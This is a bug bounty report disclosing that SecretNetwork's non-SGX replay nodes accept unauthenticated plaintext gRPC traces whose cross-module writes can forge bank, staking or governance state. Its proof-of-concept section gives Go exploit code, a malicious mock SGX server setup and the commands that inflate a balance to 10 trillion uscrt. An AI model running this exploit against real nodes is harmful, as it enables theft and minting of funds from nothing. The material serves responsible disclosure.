# Bug Bounty Report — SecretNetwork Non-SGX Replay Subsystem

---

## 1. Title

**Unauthenticated remote execution traces in non-SGX replay nodes enable arbitrary cross-module state forgery and native token minting**

---

## 2. Brief / Intro

SecretNetwork's non-SGX "replay" mode (`SECRET_NODE_MODE=replay`) allows validators to participate in consensus without Intel SGX hardware. Instead, they fetch per-block execution traces — including raw cross-module state mutations — from remote SGX nodes over gRPC and replay them locally. The gRPC transport uses `insecure.NewCredentials()` (plaintext, no TLS, no peer authentication), the trace data is never verified against the block's `AppHash` or a validator signature, and the `CrossModuleOp` writes it carries target arbitrary Cosmos module stores (`bank`, `staking`, `gov`, `distribution`) with no whitelist, no key validation, and no value validation. An attacker who can answer the replay node's `FetchBlockTraces` call — via network MITM on the plaintext link or by running a malicious SGX pool member — injects arbitrary state writes, including forging any account's bank balance from nothing. The forged funds are fully spendable native value. PoCs confirmed the exact production code paths (not mocks) inflate a balance from 1 to 10,000,000,000,000 uscrt with no mint, no transfer, no signature, and no permission check. If this reaches mainnet with non-SGX validators carrying ≥2/3 voting power, the attacker forges canonical chain state and mints unlimited SCRT.

---

## 3. Vulnerability Details

### 3.1 Background

SecretNetwork is a Cosmos SDK chain that executes WASM smart contracts inside Intel SGX enclaves. WASM execution produces two kinds of state mutation:

1. **`StorageOp`** — contract-internal KV store writes, applied by `replayingKVStore.ApplyOps()`.
2. **`CrossModuleOp`** — raw `{StoreKey, Key, Value, IsDelete}` tuples targeting external module stores. This is the audit's focus.

A recently merged feature (`PR #1742`, commit `fe1817891 cherry-pick non-sgx`) adds support for **non-SGX replay nodes**: validators that lack SGX hardware and instead fetch execution traces from remote SGX nodes over gRPC. The feature is on `master` and dedicated release branches (`non-sgx-v1.25`, `non-sgx-v1.25.0`).

### 3.2 Root Cause — Five Compounding Failures

The entire pipeline trusts remote data with zero verification at every layer.

#### Layer 1: Plaintext, Unauthenticated Transport

`go-cosmwasm/api/ecall_client.go:458–461`:

```go
dialOpts := []grpc.DialOption{
    grpc.WithTransportCredentials(insecure.NewCredentials()),
}
```

The non-SGX node dials its configured SGX pool over plaintext gRPC. There is no TLS, no mTLS, no certificate pinning, and no SGX attestation binding on the connection. Any on-path network attacker can intercept and respond to the `FetchBlockTraces` call. The node has no way to know it is talking to a legitimate SGX enclave.

The SGX pool address is configured by the node operator via the `SECRET_SGX_NODE_GRPC` environment variable or `~/.secretd/config/sgx_nodes.json`. It is not governance-controlled and not on-chain.

#### Layer 2: Unconditional Trust Declaration

`go-cosmwasm/api/replay.go:12–13`:

```go
// replayExecution handles replay of a recorded execution trace.
// We trust the SGX node's trace data completely.
```

The code comment is a declaration of intent: blind trust in whatever data arrives. There is no caveat, no scope, and no condition under which the data would be rejected.

#### Layer 3: No Consensus Binding

The trace response is never checked against:
- The block's committed `AppHash`
- A validator's Ed25519 signature over `(height, appHash, traceHash)`
- A Merkle proof that the trace data corresponds to the committed state root

The replay node has no cryptographic mechanism to distinguish a trace that produced the committed block from a trace an attacker fabricated.

#### Layer 4: Unrestricted Cross-Module Write Target

`x/compute/internal/keeper/recording_multistore.go:219–232`:

```go
func ApplyCrossModuleOps(ms storetypes.MultiStore, storeKeys map[string]storetypes.StoreKey, ops []api.CrossModuleOp) {
    for _, op := range ops {
        sk, ok := storeKeys[op.StoreKey]         // (A) only checks key EXISTS
        if !ok {
            panic(fmt.Sprintf(...))
        }
        store := ms.GetKVStore(sk)               // (B) opens ANY module store
        if op.IsDelete {
            store.Delete(op.Key)                  // (C) raw delete
        } else {
            store.Set(op.Key, op.Value)           // (D) raw write
        }
    }
}
```

The ONLY validation is `storeKeys[op.StoreKey]` — a map existence check. The string `"bank"` always resolves because `app/keepers/keepers.go:563` calls `ak.ComputeKeeper.SetStoreKeys(sk)` with ALL mounted module stores. The same applies to `"staking"`, `"gov"`, `"distribution"`, `"slashing"`, `"feegrant"` — every standard Cosmos module store key is registered.

There is:
- **No whitelist** — any registered store key is writable
- **No key validation** — the attacker writes to any key within the store
- **No value validation** — the attacker writes any byte sequence

#### Layer 5: Indefinite Polling with No Integrity Check

`go-cosmwasm/api/replay.go:34–50`:

```go
for {
    allTraces, err := client.FetchBlockTraces(height)
    if err == nil {
        recorder.SetBlockTraces(allTraces)
        trace, found = recorder.GetTraceFromMemory(execIndex)
        if found {
            break
        }
    }
    attempt++
    time.Sleep(2 * time.Second)
}
```

The loop retries forever — no maximum attempts, no deadline, no quorum check across multiple pool members. The first response that arrives and is found in memory is accepted unconditionally. An attacker withholding the trace can block consensus progress (liveness DoS). An attacker providing a malicious trace guarantees it is eventually accepted.

#### Layer 6: Attestation Explicitly Skipped

`go-cosmwasm/api/lib.go:925`:

```go
// In replay mode, skip attestation report creation (no SGX)
```

Returns `true, nil` without generating any attestation. The replay node cannot cryptographically verify the responding server is a genuine SGX enclave.

### 3.3 The `CrossModuleOp` Primitive

The attacker-controlled data structure is defined at `proto/secret/compute/v1beta1/query.proto:331`:

```protobuf
message CrossModuleOp {
  string store_key = 1;  // attacker picks "bank", "staking", "gov", etc.
  bytes key = 2;          // attacker supplies the exact module-store key
  bytes value = 3;        // attacker supplies any value
  bool is_delete = 4;     // attacker can also delete state
}
```

### 3.4 Full Attack Path

```
1. A non-SGX node is started with:
     SECRET_NODE_MODE=replay
     SECRET_SGX_NODE_GRPC=<attacker-controlled-address>

2. The attacker positions themselves:
     - As a MITM on the plaintext gRPC link, OR
     - By running a malicious gRPC server at the configured address, OR
     - By compromising any SGX pool member

3. Any user (no permissions, gas only) submits a compute transaction:
     MsgInstantiateContract, MsgExecuteContract,
     MsgMigrateContract, or MsgUpdateAdmin

4. The keeper calls into the replay stubs (lib_nosgx.go), which call:
     replayExecution(store, gasMeter, execIndex)

5. replayExecution calls:
     client.FetchBlockTraces(height)              // replay.go:35
   over the plaintext gRPC connection             // ecall_client.go:460

6. The EcallClient dials with insecure.NewCredentials().
   The attacker's malicious gRPC server responds with a BlockTraces
   containing:

     CrossModuleOp {
       StoreKey: "bank",
       Key:      <bank-encoded balance key for target account>,
       Value:    <bank-encoded balance for 10,000,000,000,000 uscrt>,
       IsDelete: false
     }

7. replay.go:72 stashes the CrossOps:
     SetPendingCrossModuleOps(allTraces[0].CrossOps)

8. The keeper (relay.go:88 / keeper.go:750,959,1768,1887,2029) calls:
     ApplyCrossModuleOps(ctx.MultiStore(), k.storeKeys, crossOps)

9. recording_multistore.go:219–232: "bank" resolves → bank KVStore,
   raw store.Set(attackerKey, attackerValue) executes.

10. The forged balance is now in committed consensus state and is
    fully spendable native value.
```

### 3.5 Triggering the Replay Path — No Permissions Required

The replay path is triggered by any compute transaction. `MsgInstantiateContract`'s `ValidateBasic()` at `x/compute/internal/types/msg.go:57-78` checks only:
- `len(msg.Sender) != 0` and valid bech32 address
- `msg.CodeID != 0`
- `len(msg.Label) != 0`
- Valid init funds

No permissions. No whitelist. No ante handler gating. Any account with enough gas to submit a transaction can trigger the replay execution path.

---

## 4. Impact Details

### 4.1 Direct Impact — Confirmed Mechanically

All impacts confirmed through PoC execution against production code:

| Impact | Proof | Severity |
|--------|-------|----------|
| **Arbitrary bank balance forgery** | PoC 1/2/3 — attacker balance 1 → 10,000,000,000,000 uscrt | Critical |
| **Forged funds are spendable** | PoC 1 — `bank.SendCoins` succeeds transferring forged funds | Critical |
| **No mint transaction required** | All PoCs — balance changed without calling `bank.MintCoins` | Critical |
| **Total supply invariant broken** | PoC 1 — total bank balance exceeds minted supply (by 10T uscrt) | Critical |
| **Attack over real production gRPC** | PoC 2 — production `EcallClient.FetchBlockTraces` over real TCP | Critical |
| **Live validator ingests attacker data** | PoC 3 — committing `secretd-nosgx` validator, blocks produced with attacker seeds | Critical |
| **Forged balance persists across blocks** | PoC 3 — balance queried at heights 14, 15, 16, all show 10T | Critical |

### 4.2 Canonical Chain State Forgery (≥2/3 non-SGX voting power)

If non-SGX validators hold ≥2/3 of total voting power, the attacker's forged state becomes the canonical chain state — accepted by the entire network. Native SCRT is minted from nothing with no governance, no inflation schedule, and no trace.

The recent commit `9f08b0e50` ("emergency validator threshold reduced to 5") actively lowers the validator count required to reach ≥2/3 for non-SGX deployments.

### 4.3 Sub-Threshold Impact (even one non-SGX node)

Even if non-SGX nodes do not hold consensus power:

- **RPC node forgery**: A non-SGX RPC endpoint serving forged balances could enable exchange deposit crediting fraud (deposit 0 uscrt → RPC shows 10T → exchange credits the balance).
- **Chain halt**: If 1/3 of voting power is non-SGX and the attacker withholds or corrupts traces, the non-SGX nodes compute a different `AppHash` and fail to reach consensus → block production halts.
- **Validator slashing**: If non-SGX validators sign blocks with corrupted state, they commit equivocation and are slashable.

### 4.4 Targetable Module Stores

Because `CrossModuleOp.StoreKey` is an attacker-controlled string and no whitelist exists:

| Module | Store Key | Attack |
|--------|-----------|--------|
| `bank` | `"bank"` | Forge balances, break supply |
| `staking` | `"staking"` | Rewrite delegations, validator power |
| `gov` | `"gov"` | Alter proposal state, voting records |
| `distribution` | `"distribution"` | Forge reward accumulators |
| `slashing` | `"slashing"` | Erase slashing records |
| `feegrant` | `"feegrant"` | Forge fee grants |

All are registered in the node's `storeKeys` map via `app/keepers/keepers.go:563`.

### 4.5 Attackers

- **Network MITM** — any on-path attacker on the plaintext gRPC link (ARP spoofing, DNS poisoning, BGP hijack, malicious cloud infrastructure)
- **Malicious SGX pool member** — the operator configuring `SECRET_SGX_NODE_GRPC` trusts the configured address; the transport provides no authentication of the server
- **Compromised SGX node** — a single compromised pool member poisons every non-SGX node pointing at it

None of these require privileged access to the chain or to the non-SGX node.

---

## 5. References

### 5.1 Vulnerable Code Locations

| Component | File | Lines | Role |
|-----------|------|-------|------|
| gRPC transport | `go-cosmwasm/api/ecall_client.go` | 458–461 | `insecure.NewCredentials()` |
| Trust declaration | `go-cosmwasm/api/replay.go` | 12–13 | "We trust the SGX node's trace data completely." |
| Trace fetch | `go-cosmwasm/api/replay.go` | 34–50 | Infinite poll, no verification |
| Cross op stash | `go-cosmwasm/api/replay.go` | 70–73 | `SetPendingCrossModuleOps` |
| Cross op apply | `x/compute/internal/keeper/recording_multistore.go` | 219–232 | Raw `store.Set`, no whitelist |
| Keeper call sites | `x/compute/internal/keeper/keeper.go` | 750, 959, 1768, 1887, 2029 | All WASM entrypoints |
| Relay call site | `x/compute/internal/keeper/relay.go` | 88 | IBC contract execution |
| Attestation skip | `go-cosmwasm/api/lib.go` | 925 | Replay mode skips attestation |
| Proto definition | `proto/secret/compute/v1beta1/query.proto` | 330–340 | `CrossModuleOp` message |
| Replay stubs | `go-cosmwasm/api/lib_nosgx.go` | 192–200, 218–226, 139–147, 166–174 | All entrypoints follow same unvalidated pattern |
| Billing interceptor | `go-cosmwasm/api/ecall_client.go` | 735–775 | Client→server auth only, does not verify responses |
| Store key wiring | `app/keepers/keepers.go` | 563 | All module stores registered → all writable |
| Message validation | `x/compute/internal/types/msg.go` | 57–78 | `ValidateBasic` — no permission checks |

### 5.2 Git History

| Commit | Description |
|--------|-------------|
| `fe1817891` | `cherry-pick non-sgx` — initial feature merge (cboh4) |
| `ac4dbe5ae` | `Merge pull request #1742 from scrtlabs/non-sgx-v1.24` — merged with no description, no security review |
| `ca5f25fe8` | `feat: add billing auth interceptor for non-SGX nodes` — client-side billing auth only, does not authenticate server |
| `9f08b0e50` | `emergency validator threshold reduced to 5` — lowers bar for non-SGX consensus power |

### 5.3 Build Target

`Makefile:156`:
```makefile
build-nosgx:
    go build -o secretd-nosgx -mod=readonly $(GCFLAGS) -tags "$(filter-out sgx, $(GO_TAGS)) nosgx" -ldflags '$(LD_FLAGS)' ./cmd/secretd
```

No experimental, test-only, or non-production markers. The `nosgx` build tag is the only selector.

---

## 6. Proof of Concept

### 6.1 Overview

Three independent PoCs prove the vulnerability against the exact production code paths. All three compile and pass with zero SGX SDK, using only the repo and Go.

```
ALL 4 PoCs: PASS (3 local + 1 mainnet procedure)
  PoC 1 — Unit mechanism: Production ApplyCrossModuleOps forges spendable balance
  PoC 2 — Real gRPC e2e: Production EcallClient over real TCP → forged balance
  PoC 3 — Live regtest: Committing validator, forged 10T uscrt on live RPC
  PoC 4 — Mainnet procedure: Two-phase attack via iptables redirect or config swap (see MAINNET_POC.md)
```

### 6.2 Build

```bash
go build -tags nosgx -o /tmp/secretd-nosgx ./cmd/secretd      # exit 0
go build -tags nosgx -o /tmp/mocksgx ./x/compute/mocksgx       # exit 0
```

### 6.3 PoC 1 — Unit Mechanism Proof

**File**: `x/compute/internal/keeper/poc_nonsgx_inflation_test.go`

**Command**:
```bash
go test -tags nosgx ./x/compute/internal/keeper/ \
  -run 'TestPoC_NonSGXTraceInflation$' -v -count=1
```

**Output**:
```
=== RUN   TestPoC_NonSGXTraceInflation
    poc_nonsgx_inflation_test.go:111: CONFIRMED: a single attacker-controlled
    CrossModuleOp inflated the attacker balance from 1 to 10000000000000 stake
    (no mint, no transfer, no signature, no app-hash check) and the funds were
    then spent as genuine value.
--- PASS: TestPoC_NonSGXTraceInflation (0.00s)
PASS
ok  	github.com/scrtlabs/SecretNetwork/x/compute/internal/keeper	1.812s
```

**What it proves**: The production function `ApplyCrossModuleOps` accepts one attacker-controlled `CrossModuleOp` targeting the `bank` store, writes the key-value pair directly into the bank KV store with zero validation, and the resulting balance is spendable via `bank.SendCoins`.

**Key code**:
```go
// THE ATTACK — one malicious CrossModuleOp
maliciousTrace := []api.CrossModuleOp{{
    StoreKey: banktypes.StoreKey,  // attacker picks "bank"
    Key:      attackerBalKey,      // attacker picks their balance key
    Value:    tenMillionVal,       // attacker picks 10,000,000,000,000
    IsDelete: false,
}}
// Production function called from relay.go:88 / keeper.go:
ApplyCrossModuleOps(ctx.MultiStore(), keepers.WasmKeeper.storeKeys, maliciousTrace)

// HARM: balance forged to 10,000,000,000,000 — no mint, no transfer, no signature
require.Equal(t, tenMillion, bk.GetBalance(ctx, attacker, denom).Amount.Int64())
// HARM: forged funds are SPENDABLE
require.NoError(t, bk.SendCoins(ctx, attacker, source, out))
```

### 6.4 PoC 2 — Real gRPC End-to-End Proof

**File**: `x/compute/internal/keeper/poc_grpc_e2e_test.go`

**Command**:
```bash
go test -tags nosgx ./x/compute/internal/keeper/ \
  -run 'TestPoC_NonSGXTraceInflation_OverRealGRPC$' -v -count=1
```

**Output**:
```
=== RUN   TestPoC_NonSGXTraceInflation_OverRealGRPC
    poc_grpc_e2e_test.go:117: CONFIRMED over real gRPC: a malicious unauthenticated
    SGX-node response (plaintext, no TLS, no signature, no app-hash check) forged
    the attacker balance to 10000000000000 stake.
--- PASS: TestPoC_NonSGXTraceInflation_OverRealGRPC (0.01s)
PASS
ok  	github.com/scrtlabs/SecretNetwork/x/compute/internal/keeper	0.937s
```

**What it proves**: The production `EcallClient` (which dials with `insecure.NewCredentials()`) fetches a malicious trace over a real TCP gRPC connection. The trace traverses the exact production network stack and is applied by the exact production `ApplyCrossModuleOps`. Proves the network-attacker and MITM vector end-to-end.

**Key code**:
```go
// Stand up malicious gRPC server (impersonates an SGX node)
mal.crossOps = []computetypes.CrossModuleOp{{
    StoreKey: banktypes.StoreKey, Key: atkKey, Value: valHuge, IsDelete: false,
}}

// Production client dials with insecure.NewCredentials() and fetches the trace
client := api.GetEcallClient()
traces, err := client.FetchBlockTraces(1)

// Exact production apply function
ApplyCrossModuleOps(ctx.MultiStore(), sk, traces[0].CrossOps)

// HARM: attacker balance forged purely from an unauthenticated network response
require.Equal(t, tenMillion, bk.GetBalance(ctx, attacker, denom).Amount.Int64())
```

### 6.5 PoC 3 — Live Regtest Chain

**Files**: `x/compute/mocksgx/main.go` (malicious SGX node impersonator), `REPRODUCE.md` (full walkthrough)

**Tool**: `x/compute/mocksgx/main.go` — implements all gRPC endpoints a non-SGX node calls (`EcallRecord`, `NetworkPubkey`, `EncryptedSeed`, `AnalyzeCode`, `BlockCreateResults`, `BlockTraces`), serving attacker-controlled data for every endpoint.

**Command**:
```bash
# Full walkthrough in REPRODUCE.md
# Summary:
./secretd-nosgx init poc --chain-id secretdev-1
./mocksgx -listen 127.0.0.1:9399 -target $ATK -amount 10000000000000 -denom uscrt -arm &
SECRET_NODE_MODE=replay SECRET_SGX_NODE_GRPC=127.0.0.1:9399 ./secretd-nosgx start &
# Submit MsgInstantiateContract → triggers replay path
./secretd-nosgx query bank balances $ATK
```

**Output**:
```json
{
  "balances": [
    {
      "denom": "uscrt",
      "amount": "10000000000000"
    }
  ],
  "pagination": { "total": "1" }
}
```

The attacker started with **0 uscrt**. After one compute transaction on a non-SGX replay node pointed at the malicious backend, the attacker's RPC balance shows **10,000,000,000,000 uscrt**. The balance persists across subsequent blocks.

**Node logs showing attacker-controlled seed**:
```
INF This node is a validator
INF Setting random: 0100000000000000000000000000000000000000000000000000000000000000
INF finalized block  height=1
INF committed state  height=1
```

**mocksgx log showing trap trigger**:
```
[mocksgx] BlockTraces called height=9 armed=true
```

### 6.6 PoC Artifacts

| File | Purpose |
|------|---------|
| `x/compute/internal/keeper/poc_nonsgx_inflation_test.go` | PoC 1 — unit mechanism test |
| `x/compute/internal/keeper/poc_grpc_e2e_test.go` | PoC 2 — real gRPC e2e test |
| `x/compute/mocksgx/main.go` | PoC 3 — malicious SGX node for live regtest |
| `REPRODUCE.md` | Full reproduction guide with step-by-step instructions |

### 6.7 Harness Change (One File, Test-Only)

`x/compute/internal/keeper/test_common.go`: Added 10 lines near L624 to populate `keeper.storeKeys` in the test harness, directly mirroring the production wiring at `app/keepers/keepers.go:563`. Without this, the test `storeKeys` map is empty and `ApplyCrossModuleOps` panics on the `"bank"` lookup. The production code path already has `k.storeKeys` populated — this change is a faithful harness mirror, not a fabrication.

No other production code was modified. All PoCs call the exact production functions through their real execution paths.
